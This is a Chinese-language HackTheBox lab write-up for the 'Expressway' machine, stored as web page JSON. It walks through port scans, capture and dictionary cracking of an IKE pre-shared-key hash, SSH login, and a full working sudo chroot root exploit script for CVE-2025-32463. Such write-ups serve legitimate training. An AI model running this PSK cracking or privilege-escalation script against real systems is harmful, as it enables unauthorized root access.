{"pageProps":{"postData":{"id":"HackTheBoxSeason9 - Expressway","contentHtml":"<h1>Season9 - Expressway</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/736\">https://app.hackthebox.com/machines/736</a></p>\n</blockquote>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<p>不对劲</p>\n<pre><code class=\"hljs language-bash\">➜  Expressway nmap -sT -min-rate 5000 -p- 10.10.11.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 17:00 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.87\nHost is up (0.054s latency).\nNot shown: 65534 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 12.77 seconds\n</code></pre>\n<p>再把 UDP 给扫描了</p>\n<pre><code class=\"hljs language-bash\">➜  Expressway nmap -sU -min-rate 5000 -p- 10.10.11.87 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 17:01 CST\nWarning: 10.10.11.87 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.87\nHost is up (0.056s latency).\nNot shown: 65388 open|filtered udp ports (no-response), 146 closed udp ports (port-unreach)\nPORT    STATE SERVICE\n500/udp open  isakmp\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 145.03 seconds\n</code></pre>\n<h3>Ike-scan</h3>\n<p>通过 <code>Ike-scan</code> 探测 IKE 服务器，有种 IPsec 秘钥协商的既视感</p>\n<pre><code class=\"hljs language-bash\">➜  Expressway ike-scan -A 10.10.11.87\nStarting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=c119d10bd1daae8a) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)\n\nEnding ike-scan 1.9.6: 1 hosts scanned <span class=\"hljs-keyword\">in</span> 0.082 seconds (12.17 hosts/sec).  1 returned handshake; 0 returned notify\n</code></pre>\n<p>尝试握手，捕获这个哈希并进行离线破解</p>\n<pre><code class=\"hljs language-bash\">➜  Expressway ike-scan -A --<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"ike@expressway.htb\"</span> -Ppsk_hash.txt 10.10.11.87\nStarting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=9e4e89d12cadbe8b) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)\n\nEnding ike-scan 1.9.6: 1 hosts scanned <span class=\"hljs-keyword\">in</span> 0.090 seconds (11.14 hosts/sec).  1 returned handshake; 0 returned notify\n</code></pre>\n<p>通过 <code>psk-crack</code> 进行破解，这里使用 <code>hashcat</code> 也可以</p>\n<pre><code class=\"hljs language-bash\">➜  Expressway <span class=\"hljs-built_in\">cat</span> psk_hash.txt \nb0d6afb205715a1ab908e8f6fdb0cffc9105205365ca1f414a92fa45a6cbfba25663f7e70974282002bcbecc72af74d83561bdc1703ac8777cc9491366aa4a0e7b73829cf892df0925e54eba010ccdff225dcb889fdc06161eb4d0f35800f6d30dfb486a25e47b558d54e8a8159da7641dbb2e70944922ef7bf47d4cf1256a53:1c4a7c7a3d58bb0992a926165a26ff40844990e82eb3ad1b5d6f2bf97ef75ae1e24afea9103735259df8bb62f4d3c6f6950250a3d5cd276d51dbe27a257a29b694cd04e2816c7e236b34e33ded8534a35000f97c77257ff8c13474da74a8146019e6b34d7c414acdbf30e2345db6b7bbfc3910e09264a4b71957ce6fd6ac75c3:9e4e89d12cadbe8b:156c27811e684dff:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:99581d830ef389f33356bab22c0a23452e5f632d:42f9eb4b50daa9324936fb5ab5d0d4b8197ed17744fd32b50296f319b9c24a58:b441ef0bd5db912fc63efe78ea012d58a5254686\n</code></pre>\n<p>得到密码 <code>freakingrockstarontheroad</code></p>\n<pre><code class=\"hljs language-bash\">➜  Expressway psk-crack -d /usr/share/wordlists/rockyou.txt psk_hash.txt \nStarting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)\nRunning <span class=\"hljs-keyword\">in</span> dictionary cracking mode\nkey <span class=\"hljs-string\">\"freakingrockstarontheroad\"</span> matches SHA1 <span class=\"hljs-built_in\">hash</span> b441ef0bd5db912fc63efe78ea012d58a5254686\nEnding psk-crack: 8045040 iterations <span class=\"hljs-keyword\">in</span> 11.991 seconds (670912.62 iterations/sec)\n</code></pre>\n<p>得到秘钥后，尝试使用密码加上 <code>ike@expressway.htb</code> 尝试进行登录，没想到登陆成功了</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Expressway/image.png\" alt=\"image.png\"></p>\n<p>读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">ike@expressway:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>权限提升</h2>\n<p>查看拥有 suid 权限的程序</p>\n<pre><code class=\"hljs language-bash\">ike@expressway:/tmp$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/usr/sbin/exim4\n/usr/local/bin/sudo\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/gpasswd\n/usr/bin/su\n/usr/bin/sudo\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper\n/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper\n</code></pre>\n<p>发现有两个 <code>sudo</code> ，查看一下一版本</p>\n<pre><code class=\"hljs language-bash\">ike@expressway:/tmp$ /usr/local/bin/sudo --version\nSudo version 1.9.17\nSudoers policy plugin version 1.9.17\nSudoers file grammar version 50\nSudoers I/O plugin version 1.9.17\nSudoers audit plugin version 1.9.17\nike@expressway:/tmp$ /usr/bin/sudo --version\nSudo version 1.9.13p3\nSudoers policy plugin version 1.9.13p3\nSudoers file grammar version 50\nSudoers I/O plugin version 1.9.13p3\nSudoers audit plugin version 1.9.13p3\n</code></pre>\n<p>在网上能找到一个CVE <code>CVE-2025-32462</code>：<a href=\"https://www.exploit-db.com/exploits/52354\">https://www.exploit-db.com/exploits/52354</a></p>\n<blockquote>\n<p><a href=\"https://github.com/kh4sh3i/CVE-2025-32463\">https://github.com/kh4sh3i/CVE-2025-32463</a></p>\n</blockquote>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># 1.sh</span>\n<span class=\"hljs-comment\">#!/bin/bash</span>\n<span class=\"hljs-comment\"># sudo-chwoot.sh</span>\n<span class=\"hljs-comment\"># CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch</span>\n<span class=\"hljs-comment\">#                  @ Stratascale Cyber Research Unit (CRU)</span>\nSTAGE=$(<span class=\"hljs-built_in\">mktemp</span> -d /tmp/sudowoot.stage.XXXXXX)\n<span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">${STAGE?}</span> || <span class=\"hljs-built_in\">exit</span> 1\n\n<span class=\"hljs-built_in\">cat</span> > woot1337.c&#x3C;&#x3C;<span class=\"hljs-string\">EOF\n#include &#x3C;stdlib.h>\n#include &#x3C;unistd.h>\n\n__attribute__((constructor)) void woot(void) {\n  setreuid(0,0);\n  setregid(0,0);\n  chdir(\"/\");\n  execl(\"/bin/bash\", \"/bin/bash\", NULL);\n}\nEOF</span>\n\n<span class=\"hljs-built_in\">mkdir</span> -p woot/etc libnss_\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"passwd: /woot1337\"</span> > woot/etc/nsswitch.conf\n<span class=\"hljs-built_in\">cp</span> /etc/group woot/etc\ngcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c\n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"woot!\"</span>\n<span class=\"hljs-built_in\">sudo</span> -R woot woot\n<span class=\"hljs-built_in\">rm</span> -rf <span class=\"hljs-variable\">${STAGE?}</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Expressway/image1.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">root@expressway:/root# <span class=\"hljs-built_in\">cat</span> root.txt \nxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>梭哈</p>\n<p>迷茫</p>","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","updated":"2025-09-21","tags":["HackTheBox","Linux","IKE","CVE-2025-32463","encrypt"],"categories":"靶机","comments":true,"description":"Season9 - Expressway\n\n https://app.hackthebox.com/machines/736\n \n\nRecon\n\nPortScan\n\n不对劲\n\n\n\n再把 UDP 给扫描了\n\n\n\nIke-scan\n\n通过 `Ike-scan` 探测 IKE 服务器，有种 IPsec 秘钥协商的既视感\n\n\n\n尝试握手，捕获这个哈希并进行离线破解\n\n\n\n通过 `psk-crack` 进行...","isEncrypted":true}},"__N_SSG":true}